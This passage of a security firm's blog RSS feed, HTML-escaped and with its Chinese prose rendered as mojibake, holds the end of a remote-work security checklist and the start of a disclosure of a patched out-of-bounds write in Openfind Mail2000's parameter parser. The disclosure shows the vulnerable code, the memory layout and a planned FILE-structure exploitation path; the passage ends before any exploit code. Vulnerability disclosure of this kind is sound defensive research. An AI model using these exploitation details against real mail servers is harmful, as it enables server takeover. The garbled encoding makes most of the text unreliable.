  &lt;li&gt;&lt;strong&gt;ç¦æ­¢ä½¿ç”¨å…¬ç”¨é›»è…¦ç™»å…¥å…¬å¸ç³»çµ±&lt;/strong&gt;ï¼šå¤–é¢çš„å…¬ç”¨é›»è…¦é›£ç¢ºä¿æ²’æœ‰å¾Œé–€ã€Keylogger ä¹‹é¡çš„æƒ¡æ„ç¨‹å¼ï¼Œä¸€å®šè¦ç¦æ­¢ä½¿ç”¨å…¬ç”¨é›»è…¦ä¾†ç™»å…¥ä»»ä½•ç³»çµ±ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¢ºèªé€£ç·šè£ç½®æ˜¯å¦å¯å–å¾—å…§ç¶² IP ä½å€&lt;/strong&gt;ï¼šç¢ºèªå…§ç¶² IP ä½å€æ˜¯å¦ç„¡èª¤ï¼Œæ˜¯å¦èƒ½å¤ æ­£å¸¸å­˜å–å…¬å¸å…§éƒ¨ç³»çµ±ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¢ºèªé€£ç·šçš„å°å¤– IP ä½å€&lt;/strong&gt;ï¼šç¢ºèªé€£ç·šè‡³ç¶²éš›ç¶²è·¯çš„ IP ä½å€æ˜¯å¦ç‚ºé æœŸï¼Œå°¤å…¶æ˜¯è³‡å®‰æœå‹™å…¬å¸ï¼Œå°å®¢æˆ¶é€£ç·šçš„ IP ä½å€è‹¥æœ‰éŒ¯èª¤ï¼Œå¯èƒ½é‡€æˆéå¸¸åš´é‡çš„æå®³ã€‚&lt;/li&gt;
  &lt;li&gt;ï¼ˆé¸æ“‡æ€§ï¼‰&lt;strong&gt;å®‰è£å€‹äººé›»è…¦é˜²ç«ç‰†&lt;/strong&gt;ï¼šå€‹äººé˜²ç«ç‰†å¯ä»¥åŸºæœ¬ç›£æ§æœ‰ç„¡å¯ç–‘ç¨‹å¼æƒ³å°å¤–é€£ç·šã€‚&lt;/li&gt;
  &lt;li&gt;ï¼ˆé¸æ“‡æ€§ï¼‰&lt;strong&gt;æ¡ç”¨ E2EE é€šè¨Šå·¥å…·&lt;/strong&gt;ï¼šç›®å‰ä¼æ¥­éƒ½æœƒä½¿ç”¨é›²ç«¯é€šè¨Šè»Ÿé«”ï¼Œé€šè¨Šè»Ÿé«”å»ºè­°æ¡ç”¨æœ‰ E2EE (End-to-End Encryption)ï¼Œå¦‚æ­¤å¯ä»¥ç¢ºä¿å…¬å¸å…§çš„æ©Ÿæ•é€šè¨Šå…§å®¹åªæœ‰å…§éƒ¨äººå“¡æ‰èƒ½è§£å¯†ï¼Œå°±é€£å¹³å°å•†ä¹Ÿç„¡æ³•å­˜å–ã€‚&lt;/li&gt;
  &lt;li&gt;ï¼ˆé¸æ“‡æ€§ï¼‰&lt;strong&gt;å·¥ä½œæ™‚é—œé–‰ä¸å¿…è¦çš„é€£ç·š&lt;/strong&gt;ï¼ˆå¦‚è—ç‰™ç­‰ï¼‰ï¼šéƒ¨åˆ†è³‡å®‰å°ˆå®¶è¡¨ç¤ºï¼Œå»ºè­°åœ¨å·¥ä½œæ™‚å°‡é›»è…¦çš„éå¿…è¦é€£ç·šç®¡é“å…¨æ•¸é—œé–‰ï¼Œå¦‚è—ç‰™ç­‰ï¼Œåœ¨å¤–éƒ¨å…¬çœ¾ç’°å¢ƒæˆ–è¨±æœ‰å¿ƒäººå£«å¯ä»¥é€éè—ç‰™ exploit æ”»æ“Šå€‹äººè£ç½®ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è³‡æ–™ç®¡ç†&quot;&gt;è³‡æ–™ç®¡ç†&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;åªç•™å­˜åœ¨å…¬å¸è¨­å‚™&lt;/strong&gt;ï¼šå…¬å¸çš„æ©Ÿæ•è³‡æ–™ã€æ–‡ä»¶ç­‰ï¼Œå¿…é ˆåªç•™å­˜åœ¨å…¬å¸è¨­å‚™ä¸­ï¼Œé¿å…è³‡æ–™å¤–æ´©ä»¥åŠç®¡ç†å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¨½æ ¸è¨˜éŒ„&lt;/strong&gt;ï¼šè¨˜éŒ„æ©Ÿæ•è³‡æ–™çš„å­˜æ”¾ã€ä¿®æ”¹ã€æ“æœ‰äººç­‰è³‡è¨Šã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;é‡è¦æ–‡ä»¶åŠ å¯†&lt;/strong&gt;ï¼šé‡è¦çš„æ–‡ä»¶å¿…é ˆåŠ å¯†ï¼Œä¸”å¯†ç¢¼ä¸å¾—å­˜æ”¾åœ¨åŒä¸€ç›®éŒ„ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ä¿¡ä»¶é™„ä»¶åŠ å¯†&lt;/strong&gt;ï¼Œå¯†ç¢¼é€éå¦ä¸€ç®¡é“å‚³éï¼šéƒµä»¶çš„é™„ä»¶é™¤äº†è¦åŠ å¯†ä¹‹å¤–ï¼Œå¯†ç¢¼å¿…é ˆä½¿ç”¨å¦ä¸€ç®¡é“å‚³éã€‚ä¾‹å¦‚ç•¶é¢å‘ŠçŸ¥ã€äº‹å‰ç´„å®šã€é€é E2EE åŠ å¯†é€šé“ã€æˆ–è€…æ˜¯é€ééç¶²è·¯æ–¹å¼çµ¦äºˆã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å‚™ä»½è³‡æ–™&lt;/strong&gt;ï¼šæ©Ÿæ•è³‡æ–™ä¸€å®šè¦å‚™ä»½ï¼Œå¯ä»¥éµå¾ªã€Œ3-2-1 Backup Strategyã€ï¼šä¸‰ä»½å‚™ä»½ã€å…©ç¨®åª’é«”ã€ä¸€å€‹æ”¾ç½®ç•°åœ°ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å¯¦é«”å®‰å…¨&quot;&gt;å¯¦é«”å®‰å…¨&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;é›¢é–‹é›»è…¦æ™‚ç«‹åˆ»é–å®šè¢å¹•&lt;/strong&gt;ï¼šé›¢é–‹é›»è…¦çš„ç¿’æ…£æ˜¯é¦¬ä¸Šé€²å…¥è¢å¹•ä¿è­·ç¨‹å¼ä¸¦ä¸”é–å®šï¼Œä¸å°‘æœ‹å‹æ˜¯æ”¾è‘—è®“ä»–ç­‰ä»–è‡ªå·±é€²å…¥é–å®šï¼Œä½†é€™å€‹æ™‚é–“å·®æœ‰å¿ƒäººå£«å·²ç¶“å¯ä»¥å®Œæˆæ”»æ“Šã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¦æ­¢æ’å…¥ä¾†è·¯ä¸æ˜çš„éš¨èº«ç¢Ÿæˆ–è£ç½®&lt;/strong&gt;ï¼šç¤¾äº¤å·¥ç¨‹çš„æ‰‹æ³•ä¹‹ä¸€ï¼Œå°±æ˜¯è®“åŒä»æ’å…¥æƒ¡æ„çš„ USBï¼Œç”šè‡³æœ‰å¯èƒ½æ‘§æ¯€é›»è…¦ï¼ˆBad USB, USB Killerï¼‰ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;æ³¨æ„å¤–äººå·çªºè¢å¹•æˆ–ç¢°è§¸è¨­å‚™&lt;/strong&gt;ï¼šè‹¥å¸¸åœ¨å¤–å·¥ä½œè™•æ–¼å…¬å…±ç©ºé–“ï¼Œå¯ä»¥è€ƒæ…®æ¡è³¼è¢å¹•é˜²çªºç‰‡ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ä¸æ”¾ç½®é›»è…¦è¨­å‚™åœ¨è»Šä¸Š&lt;/strong&gt;ï¼šé›–ç„¶å°ç£æ²»å®‰ä¸éŒ¯ï¼Œä½†ä¹Ÿæ˜¯ä¸å°‘ç­†é›»åœ¨è»Šä¸Šé­ç«Šï¼Œé‡è¦è³‡ç”¢è¨˜å¾—éš¨èº«æ”œå¸¶ï¼Œæˆ–è€…æ”¾ç½®åœ¨éš±å¯†è™•ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å°‡å·¥ä½œå€åŸŸé—œé–€æˆ–é–ä¸Š&lt;/strong&gt;ï¼šè‹¥åœ¨è‡ªå·±çš„å·¥ä½œå€åŸŸï¼Œç‚ºäº†çˆ­å–æ›´å¤šæ™‚é–“æ‡‰è®Šçªç™¼ç‹€æ³ï¼Œå»ºè­°å°‡å·¥ä½œå€åŸŸçš„é–€é—œé–‰æˆ–è€…ä¸Šé–ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tldr-é˜²ç–«åŒæ™‚ä¹Ÿåˆ¥å¿½è¦–è³‡è¨Šå®‰å…¨&quot;&gt;TL;DR é˜²ç–«åŒæ™‚ä¹Ÿåˆ¥å¿½è¦–è³‡è¨Šå®‰å…¨ï¼&lt;/h2&gt;

&lt;p&gt;ç¶²è·¯çš„æ”»é˜²å°±æ˜¯ä¸€å ´æˆ°çˆ­ï¼Œå¦‚æœä¸å¾æ”»æ“Šè€…çš„é¢å‘å»æ€è€ƒé˜²ç¦¦ç­–ç•¥ï¼Œä¸ä½†ç„¡æ³•æœ‰æ•ˆçš„æ¸›ç·©æ”»æ“Šï¼Œæ›´å¯èƒ½åœ¨å…¨ä¸–ç•Œç–«æƒ…é€æ¼¸å¤±æ§çš„ç•¶ä¸‹ï¼Œè®“æƒ¡æ„äººå£«é€éé€™æ¨£çš„æ™‚æ©Ÿæ”»æ“Šé è·å·¥ä½œçš„ä¼æ¥­ã€‚æœŸæœ›æˆ‘å€‘çš„ç¶“é©—åˆ†äº«èƒ½å¤ çµ¦ä¼æ¥­ä¸€äº›åŸºæœ¬çš„æŒ‡å¼•ï¼Œä¹Ÿå¸Œæœ›å¤©ç½äººç¦èƒ½å¤ å„˜é€Ÿæ¶ˆå½Œã€‚å°ç£åŠ æ²¹ï¼&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;é–‹æ”¾ VPN æœå‹™å‰ï¼Œæ³¨æ„å¸³è™Ÿç®¡ç†ä»¥åŠå…§ç¶²åˆ‡å‰²éš”é›¢ï¼Œé¿å…é€é VPN å­˜å–å…§ç¶²ä»»æ„ä¸»æ©Ÿã€‚&lt;/li&gt;
  &lt;li&gt;é›²ç«¯ã€ç¶²è·¯æœå‹™å‹™å¿…ä½¿ç”¨ç¨ä¸€ç„¡äºŒé•·å¯†ç¢¼ï¼Œä¸¦é–‹å•Ÿ MFA / 2FA å¤šå› å­èªè­‰ã€‚&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨é›²ç«¯æœå‹™æ™‚å‹™å¿…ç›¤é»å­˜å–æ¬Šé™ï¼Œé¿å…æ–‡ä»¶é€£çµå¯è¢«ä»»æ„äººå­˜å–ã€‚&lt;/li&gt;
  &lt;li&gt;æ³¨æ„è¨­å‚™éºå¤±ã€ç«Šå–ã€ç¤¾äº¤å·¥ç¨‹ç­‰å¯¦é«”å®‰å…¨è­°é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;ç¶²è·¯æ˜¯å±éšªçš„ï¼Œè«‹ä½¿ç”¨å¯ä¿¡è³´çš„ç¶²è·¯ï¼Œä¸¦åœ¨é€šè¨Šã€å‚³è¼¸æ™‚æ¡ç”¨åŠ å¯†æ–¹å¼é€²è¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2020/03/04/telework-security/</link>
                <guid>https://devco.re/blog/2020/03/04/telework-security</guid>
                <pubDate>Wed, 04 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>é£›é´¿å‚³æ›¸ - ç´…éšŠæ¼”ç·´ä¸­çš„æ•¸ä½æ“„é´¿</title>
                <description>&lt;p&gt;éƒµä»¶ç³»çµ±ä½œç‚ºå¤§éƒ¨åˆ†ä¼æ¥­ä¸»è¦çš„è³‡è¨Šäº¤æ›æ–¹å¼ï¼Œåœ¨æˆ°ç•¥ä¸Šä½”æœ‰äº†èˆ‰è¶³è¼•é‡çš„åœ°ä½ã€‚æŒæ§äº†éƒµä»¶ä¼ºæœå™¨ä¸åƒ…å¯ä»¥ç«Šè½éƒµä»¶çš„å…§å®¹ï¼Œç”šè‡³è¨±å¤šé‡è¦æ–‡ä»¶éƒ½å¯ä»¥åœ¨éƒµä»¶ç³»çµ±ä¸­æ‰¾åˆ°ï¼Œä½¿å¾—é§­å®¢èƒ½å¤ æ›´é€²ä¸€æ­¥çš„æ»²é€ã€‚æœ¬ç¯‡æ–‡ç« å°‡ä»‹ç´¹ç ”ç©¶çµ„åœ¨ Openfind Mail2000 é€™å¥—è»Ÿé«”ä¸Šç™¼ç¾çš„è¨˜æ†¶é«”æ¼æ´ï¼Œä»¥åŠåˆ©ç”¨é€™å€‹æ¼æ´çš„æ”»æ“Šæ‰‹æ³•ã€‚&lt;br /&gt;
&lt;strong&gt;æ­¤æ¼æ´ç‚º 2018 å¹´æ™‚ç™¼ç¾ï¼Œç•¶æ™‚å·²é€šå ± Openfind ä¸¦ä¸”è¿…é€Ÿè¢«ä¿®è£œï¼ŒåŒæ™‚ä¹Ÿå·²å”åŠ©ç›¸é—œç”¨æˆ¶é€²è¡Œæ›´æ–°ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;openfind-mail2000&quot;&gt;Openfind Mail2000&lt;/h2&gt;
&lt;p&gt;Mail2000 æ˜¯ä¸€å¥—ç”±å°ç£å» å•† Openfind æ‰€é–‹ç™¼ï¼Œç°¡å–®æ˜“ç”¨çš„é›»å­éƒµä»¶ç³»çµ±ï¼Œè¢«å»£æ³›ä½¿ç”¨æ–¼å°ç£çš„å…¬å®¶æ©Ÿé—œã€æ•™è‚²æ©Ÿæ§‹ï¼Œå¦‚å°åŒ—å¸‚æ•™è‚²å±€ã€ä¸­ç§‘é™¢ï¼Œä»¥åŠè‡ºç£ç§‘æŠ€å¤§å­¸éƒ½æœ‰ä½¿ç”¨ Mail2000 ä½œç‚ºä¸»è¦çš„éƒµä»¶ä¼ºæœå™¨ã€‚å¸¸è¦‹çš„å…¥å£ä»‹é¢å¦‚ä¸‹ï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™æ¬¡çš„æ¼æ´ï¼Œä¾¿æ˜¯å¾é€™å€‹ Web ä»‹é¢ï¼Œåˆ©ç”¨ Binary çš„æ‰‹æ³•ï¼Œæ”»é™·æ•´å°ä¼ºæœå™¨ï¼&lt;/p&gt;

&lt;h2 id=&quot;ä¼ºæœå™¨æ¶æ§‹&quot;&gt;ä¼ºæœå™¨æ¶æ§‹&lt;/h2&gt;
&lt;p&gt;Mail2000 æä¾›äº† Web ä»‹é¢ä¾›ç®¡ç†å“¡ä»¥åŠä½¿ç”¨è€…æ“ä½œï¼Œä¹Ÿå°±æ˜¯æ‰€è¬‚çš„ Webmailï¼Œè€Œæ­¤è™• Openfind ä½¿ç”¨äº† CGI (Common Gateway Interface) çš„æŠ€è¡“ä¾†å¯¦ä½œã€‚å¤§å¤šæ•¸ Web ä¼ºæœå™¨å¯¦ç¾ CGI çš„æ–¹å¼å¦‚åœ–ï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
é¦–å…ˆç”± httpd æ¥å—å®¢æˆ¶ç«¯çš„è«‹æ±‚å¾Œï¼Œæ ¹æ“šå°æ‡‰çš„ CGI è·¯å¾‘ï¼ŒåŸ·è¡Œç›¸å°æ‡‰çš„ CGI æª”æ¡ˆã€‚è€Œå¤§å¤šæ•¸çš„é–‹ç™¼è€…æœƒæ ¹æ“šéœ€æ±‚ï¼Œå°‡å¸¸è¦‹çš„å…±ç”¨ function æ’°å¯«æˆ libraryï¼Œä¾› CGI å‘¼å«ã€‚&lt;br /&gt;
å¾€åº•å±¤ä¾†çœ‹ï¼Œå…¶å¯¦å¯ä»¥ç™¼ç¾ï¼Œé›–ç„¶ç¨±ç‚º Web ä¼ºæœå™¨ï¼Œä»æœ‰è¨±å¤šå…ƒä»¶æ˜¯å»ºæ§‹æ–¼ binary ä¹‹ä¸Šçš„ï¼ä¾‹å¦‚ httpdï¼Œç‚ºäº†æ•ˆèƒ½ï¼Œå¤šæ˜¯ç”± C/C++ æ‰€æ’°å¯«ï¼Œè€Œå…¶å®ƒåƒæ˜¯ libraryã€æ“´å……çš„ moduleã€å„é é¢çš„ CGI ä¹Ÿå¸¸æ˜¯å¦‚æ­¤ã€‚å› æ­¤ï¼Œbinary ç›¸é—œçš„æ¼æ´ï¼Œä¾¿æ˜¯æˆ‘å€‘é€™æ¬¡çš„æ”»æ“Šç›®æ¨™ï¼&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´&quot;&gt;æ¼æ´&lt;/h2&gt;

&lt;p&gt;é€™å€‹æ¼æ´ä½æ–¼ Openfind å¯¦ä½œçš„ library &lt;code class=&quot;highlighter-rouge&quot;&gt;libm2kc&lt;/code&gt; ä¸­ï¼Œæ­¤å‡½å¼åº«åŒ…å«äº†å„ç¨® CGI é€šç”¨å‡½å¼ï¼Œå¦‚åƒæ•¸è§£æåŠæª”æ¡ˆè™•ç†ç­‰ç­‰ï¼Œè€Œé€™å€‹æ¼æ´å°±ç™¼ç”Ÿåœ¨åƒæ•¸è§£æçš„éƒ¨åˆ†ã€‚ç”±æ–¼åƒæ•¸è™•ç†æ˜¯å¾ˆåº•å±¤ä¸”åŸºæœ¬çš„åŠŸèƒ½ï¼Œå› æ­¤å½±éŸ¿çš„ç¯„åœéå¸¸çš„å¤§ï¼Œå°±é€£ Openfind çš„å…¶å®ƒç”¢å“ä¹ŸåŒæ¨£å—å½±éŸ¿ï¼&lt;br /&gt;
é€™å€‹æ¼æ´çš„è§¸ç™¼æ¢ä»¶å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;æ”»æ“Šè€…ä½¿ç”¨ multipart å½¢å¼ç™¼é€ HTTP POST è«‹æ±‚&lt;/li&gt;
  &lt;li&gt;POST å‚³é€çš„è³‡æ–™å…§å®¹è¶…é 200 é …&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;multipart æ˜¯ HTTP å”å®šä¸­ï¼Œç”¨ä¾†è™•ç†å¤šé …æª”æ¡ˆå‚³è¼¸æ™‚çš„ä¸€ç¨®æ ¼å¼ï¼Œèˆ‰ä¾‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type: multipart/form-data; boundary=AaB03x â€¨ 

â€¨--AaB03xâ€¨
Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot;â€¨
Content-Type: text/plainâ€¨

â€¨... contents of file1.txt ...
â€¨--AaB03x--
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è€Œåœ¨ libm2kc ä¸­ï¼Œä½¿ç”¨äº†é™£åˆ—ä¾†å„²å­˜åƒæ•¸ï¼š&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;é€™å€‹é™£åˆ—ç‚ºå…¨åŸŸè®Šæ•¸ g_stCGIEnv ä¸­çš„ paramï¼Œåœ¨å­˜å…¥ param é™£åˆ—æ™‚ï¼Œä¸¦æ²’æœ‰æª¢æŸ¥æ˜¯å¦å·²è¶…éå®£å‘Šçš„é™£åˆ—å¤§å°ï¼Œå°±é€ æˆäº†è¶Šç•Œå¯«å…¥ã€‚&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œparam é™£åˆ—æ‰€å„²å­˜çš„çµæ§‹ç‚ºæŒ‡å‘å­—ä¸²ä½ç½®çš„æŒ‡æ¨™ï¼Œè€Œéå­—ä¸²æœ¬èº«&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;å› æ­¤ç•¶è§¸ç™¼è¶Šç•Œå¯«å…¥æ™‚ï¼Œå¯«å…¥è¨˜æ†¶é«”çš„å€¼ä¹Ÿæ˜¯ä¸€å€‹å€‹æŒ‡å‘å­—ä¸²çš„æŒ‡æ¨™ï¼Œè€Œè¢«æŒ‡å‘çš„å­—ä¸²å…§å®¹å‰‡æ˜¯é€ æˆæº¢å‡ºçš„åƒæ•¸ã€‚&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´åˆ©ç”¨&quot;&gt;æ¼æ´åˆ©ç”¨&lt;/h2&gt;

&lt;p&gt;è¦åˆ©ç”¨è¶Šç•Œå¯«å…¥çš„æ¼æ´ï¼Œå°±è¦å…ˆäº†è§£åˆ©ç”¨é€™å€‹æº¢å‡ºå¯ä»¥åšåˆ°ä»€éº¼ï¼Œç™¼ç”Ÿæº¢å‡ºçš„å…¨åŸŸè®Šæ•¸çµæ§‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 CGIEnv          struc ; (sizeof=0x6990, mappedto_95)
00000000 buf             dd ?                    ; offset
00000004 length          dd ?
00000008 field_8         dd 6144 dup(?)          ; offset
00006008 param_arr       param 200 dup(?)
00006968 file_vec        dd ?                    ; offset
0000696C vec_len         dd ?
00006970 vec_cur_len     dd ?
00006974 arg_cnt         dd ?
00006978 field_6978      dd ?
0000697C errcode         dd ?
00006980 method          dd ?
00006984 is_multipart    dd ?
00006988 read_func       dd ?
0000698C field_698C      dd ?
00006990 CGIEnv          ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;æº¢å‡ºçš„é™£åˆ—ç‚ºå…¶ä¸­çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;param_arr&lt;/code&gt;ï¼Œå› æ­¤åœ¨å…¶ä¹‹å¾Œçš„è®Šæ•¸çš†å¯èƒ½è¢«è¦†å¯«ã€‚åŒ…æ‹¬&lt;code class=&quot;highlighter-rouge&quot;&gt;post_files&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;vec_len&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;vec_cur_len&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;arg_cnt&lt;/code&gt; â€¦ ç­‰ç­‰ã€‚å…¶ä¸­æœ€å¸å¼•æˆ‘æ³¨æ„çš„æ˜¯&lt;code class=&quot;highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;é€™å€‹è®Šæ•¸ï¼Œé€™æ˜¯ä¸€å€‹ç”¨ä¾†ç®¡ç† POST ä¸Šå‚³æª”æ¡ˆçš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;vector&lt;/code&gt;ï¼Œå¤§éƒ¨åˆ†çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;vector&lt;/code&gt; çµæ§‹åƒæ˜¯é€™æ¨£ï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/5.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;size&lt;/code&gt; è¨˜éŒ„é™£åˆ—çš„ç¸½é•·åº¦ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;end&lt;/code&gt; è¨˜éŒ„ç›®å‰ç”¨åˆ°å“ªè£¡ï¼Œé€™æ¨£å°±å¯ä»¥åœ¨å®¹é‡ä¸å¤ çš„æ™‚å€™é€²è¡Œæ“´å……ã€‚æˆ‘å€‘è‹¥åˆ©ç”¨æ¼æ´ï¼Œä½¿æº¢å‡ºçš„æŒ‡æ¨™è¦†è“‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;vector&lt;/code&gt; çš„æŒ‡æ¨™ï¼Œå°±æœ‰å¯èƒ½æœ‰æ•ˆçš„åˆ©ç”¨ï¼è—‰ç”±è¦†è“‹é€™å€‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;vector&lt;/code&gt; æŒ‡æ¨™ï¼Œæˆ‘å€‘å¯ä»¥é”åˆ°å½é€ ä¸€å€‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;POST file&lt;/code&gt;ï¼ŒåŠå…¶ä¸­æ‰€æœ‰ç›¸é—œè®Šæ•¸çš„æ•ˆæœï¼Œè€Œé€™å€‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;POST file&lt;/code&gt; çµæ§‹è£¡é¢å°±åŒ…å«äº†å„ç¨®å¸¸è¦‹çš„æª”æ¡ˆç›¸é—œè®Šæ•¸ï¼Œåƒæ˜¯è·¯å¾‘ã€æª”åï¼Œå’Œ Linux ä¸­ç”¨ä¾†ç®¡ç†æª”æ¡ˆçš„ &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FILE&lt;/code&gt; çµæ§‹&lt;/strong&gt;ï¼Œè€Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE&lt;/code&gt; çµæ§‹ä¾¿æ˜¯é€™æ¬¡çš„æ”»æ“Šçš„é—œéµï¼&lt;/p&gt;

&lt;h3 id=&quot;file-structure-exploit&quot;&gt;FILE Structure Exploit&lt;/h3&gt;

&lt;p&gt;é€™æ¬¡çš„æ”»æ“Šä½¿ç”¨äº† FILE structure exploit çš„æ‰‹æ³•ï¼Œæ˜¯è¿‘å¹¾å¹´è¼ƒæ–°ç™¼ç¾çš„æ”»æ“Šæ‰‹æ³•ï¼Œç”± angelboy åœ¨ HITCON CMT å…¬é–‹&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;sup&gt;[1]&lt;/sup&gt;&lt;/a&gt;ï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

